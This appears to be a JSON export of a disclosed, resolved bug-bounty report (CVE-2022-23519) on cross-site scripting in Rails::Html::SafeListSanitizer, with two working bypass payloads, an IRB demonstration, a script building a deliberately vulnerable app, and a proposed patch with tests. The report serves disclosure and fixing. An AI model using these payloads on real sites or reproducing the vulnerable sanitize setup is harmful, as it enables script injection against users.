@@ -1,0 +1,144 @@
+{
+  "id": 1656627,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjU2NjI3",
+  "url": "https://hackerone.com/reports/1656627",
+  "title": "Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-01T21:28:55.088Z",
+  "submitted_at": "2022-08-01T21:28:55.174Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0b5cur17y",
+    "url": "/0b5cur17y",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/oQRYWBvwMZSWFYZtEEzqK5AN/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-23519"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-12-14T22:41:10.444Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-12-14T21:02:54.631Z",
+  "team_member_agreed_on_going_public_at": "2022-12-14T22:41:10.298Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Intro\n\nThe Rails HTML sanitzier allows to set certain combinations of tags in it's allow list that are not properly handled. \nSimilar to the report [1530898](https://hackerone.com/reports/1530898), which identified the combination`select` and `style` as vulnerable,\nmy fuzz testing from today suggests that also `svg` and `style` as well as `math` and `style` allow XSS.\nThe following are PoCs for each of these allow list:\n- `svg` and `style`: `<svg><style><script>alert(1)</script></style></svg>`\n- `math` and `style`: `<math><style><img src=x onerror=alert(1)></style></math>`\n\nSee the following IRB session: \n```\nirb(main):016:0> require 'rails-html-sanitizer'\n=> false\nirb(main):017:0> Rails::Html::SafeListSanitizer.new.sanitize(\"<svg><style><script>alert(1)</script></style></svg>\", tags: [\"svg\", \"style\"]).to_s\n=> \"<svg><style><script>alert(1)</script></style></svg>\"\nirb(main):018:0> Rails::Html::SafeListSanitizer.new.sanitize(\"<math><style><img src=x onerror=alert(1)></style></math>\", tags: [\"math\", \"style\"]).to_s\n=> \"<math><style><img src=x onerror=alert(1)></style></math>\"\nirb(main):019:0> puts Rails::Html::Sanitizer::VERSION\n1.4.3\n=> nil \n```\n\n## Sample Vulnerable Rails Application\n\nTo build a sample rails application that is vulnerable, I've used the following `Dockerfile`:\n\n```\nFROM ruby:3.1.2\n\nRUN apt-get update && apt-get install -y vim\n\nWORKDIR /usr/src/app\nRUN gem install rails && rails new myapp\nWORKDIR /usr/src/app/myapp\n\n\nCOPY build-rails-app.sh ./build-rails-app.sh\nRUN sh ./build-rails-app.sh\nRUN RAILS_ENV=production rails assets:precompile\n\nCMD [\"./bin/rails\", \"server\", \"-b\", \"0.0.0.0\", \"-e\", \"production\"]\n```\n\nIn the same directory, put a shell script `build-rails-app.sh` which writes the app:\n\n```\n#!/ibn/sh\n\n# make routes\ncat << EOF > ./config/routes.rb\nRails.application.routes.draw do\n  get \"/poc1\", to: \"poc1#index\"\n  get \"/poc2\", to: \"poc2#index\"\nend\nEOF\n\n# make Poc1 endpoint\n# http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E\nbin/rails generate controller Poc1 index --skip-routes\n\ncat << EOF > ./app/controllers/poc1_controller.rb\nclass Poc1Controller < ApplicationController\n  def index\n    @name = params[:name] || \"put your name here\"\n  end\nend\nEOF\n\n\ncat << EOF > ./app/views/poc1/index.html.erb\n<h1> Hello <%= sanitize @name, tags: [\"svg\", \"style\"] %> </h1>\n<br>\nPoC with a sanitized, reflected parameter 'name' for which 'svg' annd 'style' tags are allowed.\n<br>\n<%= link_to \"Go to PoC\", \"/poc1?name=<svg><style><script>alert(1)</script></style><svg>\" %>\n<br>\n<br>\nUsing: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>\nEOF\n\n\n# make Poc2 endpoint\n# http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E\nbin/rails generate controller Poc2 index --skip-routes\n\ncat << EOF > ./app/controllers/poc2_controller.rb\nclass Poc2Controller < ApplicationController\n  def index\n    @name = params[:name] || \"put your name here\"\n  end\nend\nEOF\n\n\ncat << EOF > ./app/views/poc2/index.html.erb\n<h1> Hello <%= sanitize @name, tags: [\"math\", \"style\"] %> </h1>\n<br>\nPoC with a sanitized, reflected parameter 'name' for which 'math' annd 'style' tags are allowed.\n<br>\n<%= link_to \"Go to PoC\", \"/poc2?name=<math><style><img src=x onerror=alert(1)></style><math>\" %>\n<br>\n<br>\nUsing: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>\nEOF\n```\n\nWith the following `Makefile` you can build and run the application\n\n```\n.PHONY: build\nbuild:\n\tdocker build -t local/railspoc:latest .\n\n.PHONY: run\nrun:\n\tdocker run -it --rm -p 127.0.0.1:8888:3000 local/railspoc:latest\n```\n\nNow you have a Rails application with two routes `/poc1` and `/poc2` running locally. Visit:\n- [http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E](http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E)\n- [http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E](http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E)\n\nSee the secreenshot attached for what it will roughly look like. Both alerts should be executed.\n\n## Suggestion for Fix\n\nAlong the lines of the fix for [1530898](https://hackerone.com/reports/1530898), the following patch could prevent both vectors.\nI've just added the two new bad combinations to the check in `remove_safelist_tag_combinations` and adjusted the test to cover all of them too.\nIn all cases, the `style` tag gets removed from the whitelist, which breaks to PoC:\n\n```\nFrom f78df36644520c57770132a607cedafeec19d796 Mon Sep 17 00:00:00 2001\nFrom: Dominic Breuker <dominic.breuker@protonmail.com>\nDate: Mon, 1 Aug 2022 22:57:10 +0200\nSubject: [PATCH] disallow safelist combinations of svg+style or math+style\n\n---\n lib/rails/html/sanitizer.rb | 12 ++++++++++--\n test/sanitizer_test.rb      | 35 ++++++++++++++++++++---------------\n 2 files changed, 30 insertions(+), 17 deletions(-)\n\ndiff --git a/lib/rails/html/sanitizer.rb b/lib/rails/html/sanitizer.rb\nindex 97503c8..10cd7c4 100644\n--- a/lib/rails/html/sanitizer.rb\n+++ b/lib/rails/html/sanitizer.rb\n@@ -147,13 +147,21 @@ module Rails\n       end\n \n       def remove_safelist_tag_combinations(tags)\n-        if !loofah_using_html5? && tags.include?(\"select\") && tags.include?(\"style\")\n-          warn(\"WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select'\")\n+        if !loofah_using_html5? && dangerous_safelist?(tags)\n+          warn(\"WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select', 'svg' or 'math'\")\n           tags.delete(\"style\")\n         end\n         tags\n       end\n \n+      def dangerous_safelist?(tags)\n+        if tags.include?(\"style\")\n+          tags.include?(\"select\") || tags.include?(\"svg\") || tags.include?(\"math\")\n+        else\n+          false\n+        end\n+      end\n+\n       def allowed_tags(options)\n         if options[:tags]\n           remove_safelist_tag_combinations(options[:tags])\ndiff --git a/test/sanitizer_test.rb b/test/sanitizer_test.rb\nindex e3ce218..c52eef9 100644\n--- a/test/sanitizer_test.rb\n+++ b/test/sanitizer_test.rb\n@@ -588,22 +588,27 @@ class SanitizersTest < Minitest::Test\n   end\n \n   def test_disallow_the_dangerous_safelist_combination_of_select_and_style\n-    input = \"<select><style><script>alert(1)</script></style></select>\"\n-    tags = [\"select\", \"style\"]\n-    warning = /WARNING: Rails::Html::SafeListSanitizer: removing 'style' from safelist/\n-    sanitized = nil\n-    invocation = Proc.new { sanitized = safe_list_sanitize(input, tags: tags) }\n-\n-    if html5_mode?\n-      # if Loofah is using an HTML5 parser,\n-      #   then \"style\" should be removed by the parser as an invalid child of \"select\"\n-      assert_silent(&invocation)\n-    else\n-      # if Loofah is using an HTML4 parser,\n-      #   then SafeListSanitizer should remove \"style\" from the safelist\n-      assert_output(nil, warning, &invocation)\n+    tests = {\n+      \"<select><style><script>alert(1)</script></style></select>\" => [\"select\", \"style\"],\n+      \"<svg><style><script>alert(1)</script></style></svg>\" => [\"svg\", \"style\"],\n+      \"<math><style><img src=x onerror=alert(1)></style></math>\" => [\"math\", \"style\"],\n+    }\n+    tests.each do |input, tags| \n+      warning = /WARNING: Rails::Html::SafeListSanitizer: removing 'style' from safelist/\n+      sanitized = nil\n+      invocation = Proc.new { sanitized = safe_list_sanitize(input, tags: tags) }\n+\n+      if html5_mode?\n+        # if Loofah is using an HTML5 parser,\n+        #   then \"style\" should be removed by the parser as an invalid child of \"select\"\n+        assert_silent(&invocation)\n+      else\n+        # if Loofah is using an HTML4 parser,\n+        #   then SafeListSanitizer should remove \"style\" from the safelist\n+        assert_output(nil, warning, &invocation)\n+      end\n+      refute_includes(sanitized, \"style\")\n     end\n-    refute_includes(sanitized, \"style\")\n   end\n \n protected\n-- \n2.35.1\n\n```\n\n## Impact\n\nIt is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1848827,
+      "file_name": "rails-sanitizer-xss-pocs-1-2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4zstaub7hipkpb6n2v0dfey3jnc2?response-content-disposition=attachment%3B%20filename%3D%22rails-sanitizer-xss-pocs-1-2.png%22%3B%20filename%2A%3DUTF-8%27%27rails-sanitizer-xss-pocs-1-2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSG55IBL4%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T170423Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIAHaQGGM9uV7RXtbGBiGFEJpz8IhS%2Bb1J2JqfxF68R4sAiBpRR%2FNQ9rep8AQIAfmdAyebAyrTDj2kA3Dey7lGFZ7tCqxBQhAEAMaDDAxMzYxOTI3NDg0OSIMPtlnXKpugKDBPcJ6Ko4Ftf%2FFY4AHpj0%2Bcw5wlqcIH2kGMZTrB0gA18yO8Uj2hz2yWYYUAc6jqrVtwIoAYZ9hxMkThDbzD2GvWsz5atMKaeMSCVI2f6jt8nNyr9EGI74zaXmp7e194k6ye6xobAB7KHMWmr%2B8q5RXVTNEf%2F%2FOPqQVYSM5CXxRB4hsI%2FtWgshxon8NGrZoVVdb6grn14FrycGYXaGCnrjPyYbx272faoh6dJAKKlA3ae8FtGMTuw6nouH%2FIrc0srOTUD5UfNIWvM%2FDx62zoMx5z9%2Bryw%2BV8ys4W16DRJ6wS5YiLe4af2KmxlroQ3QR2AL2feSt%2FX5uq4C2BFpVYTxV%2BsFdjTPjPhsYOwmiuq8mRRSr5rWMNlm8%2Fr1Yf8XNCgIxaiezY1lUQX9Pd%2BdjznMQ6WQfI%2BhWI29AO4llJuTbzM22RT%2BoEDQRHAHv0WY6axPOzx9%2Bu72mPPmJ%2B%2BgeLslLlWWZrVm36x0ThBG7RgBsXS0vxQ6Eq6KGfvkej1XLqrptvpJPSkXHmgU97WePdPymfMkpVYNpe%2BrVgjs7Sr8ydrCm65w6lNyYk%2FoiZxTjzvbBxz13HSEWEXvZ1%2FET3oc1MNdOq7V8pn%2BT%2BuXkzyscF5ioAPW1vHRG4%2Fd%2B08DAXIefe6%2FEcWvjfTEE7kkSn4P4mKpnAuNYF9fqhCa4RsuXwsmrAd62ECTNVvQLx5YLbYClAc0W1DdyhkPp%2BMcfxSP3AYSGL44DVBpCI8ORWF7TBtUom4DMrXOt2XYBcMvJt40XU3zKpAVIpZV6Sp3O4Jib2%2F7ESDO5woLIyrnjGqQDGn4uy5iDgajsJ0OebEtUw7Jrz704O%2FOV5spCrCLuulixqnjv4lqnCm8azv%2F86bAgeDb8mXjCMOKV2M8GOrIBFX2jD4IwV%2BFpP%2B0lHzXpigPAhUteEkgkAIFojb3BzL6JeITOunrwXe3fov7e7LX3VTZEyGlGUkNjrzajSiIo7ZsJWRYP7UdG7M7B4K76ujF9Kgk82Ef2Fp%2BTlaFgg0r%2FwR0xQ9jB9TSbFb1XAEtjzvlW3GJgHWAALitNrlmMBP%2FIKpnX4Lq%2Bq80vYjwCwageVLQYFjhgK5A1oXBNmybZvoVF0SeHE9d8RmZjYni5%2BAUR%2Fw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b32693e60d78046300da4b63df44cf57c9b182664719432af89e8af3b7e8617b",
+      "file_size": 151269,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-01-13T21:02:54.724Z",
+  "allow_singular_disclosure_after": -104097688.53787686,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "jumpydata",
+    "zy9ard3",
+    "alejandroar",
+    "7odamoo",
+    "shubham_srt",
+    "shivammusic",
+    "meispi",
+    "ariwabtc234"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
